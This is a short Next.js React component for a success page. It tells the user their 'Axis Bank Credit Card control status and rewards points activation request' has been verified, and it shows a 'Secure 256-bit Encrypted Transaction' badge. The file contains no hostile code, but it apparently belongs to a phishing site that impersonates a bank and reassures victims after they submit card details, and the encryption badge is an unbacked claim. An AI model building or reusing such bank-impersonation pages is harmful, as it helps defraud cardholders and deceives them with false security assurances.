"use client";

import Link from "next/link";
import { CheckCircle2, ShieldCheck } from "lucide-react";

export default function SuccessPage() {
  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full border border-gray-100 text-center animate-fade-in">
        {/* Success Icon with glowing background */}
        <div className="relative mx-auto w-24 h-24 mb-6 flex items-center justify-center rounded-full bg-[#fdf2f6]">
          <div className="absolute inset-0 rounded-full bg-[#C0005A] opacity-5 animate-ping"></div>
          <CheckCircle2 size={64} className="text-[#C0005A]" />
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold text-gray-800 mb-3">
          Verification Complete
        </h1>

        {/* Description */}
        <p className="text-gray-600 text-sm leading-relaxed mb-6">
          Thank you! Your Axis Bank Credit Card control status and rewards points activation request has been verified and submitted successfully.
        </p>

        {/* Safety Badge */}
        <div className="flex items-center justify-center gap-2 bg-gray-50 border border-gray-100 rounded-lg p-3 mb-8">
          <ShieldCheck size={18} className="text-green-600" />
          <span className="text-xs font-semibold text-gray-700">
            Secure 256-bit Encrypted Transaction
          </span>
        </div>

        {/* Action Button */}
        <Link
          href="/"
          className="block w-full bg-[#C0005A] hover:bg-[#a0004a] text-white py-3 rounded-lg font-medium transition duration-200"
        >
          Go Back Home
        </Link>
      </div>
    </div>
  );
}
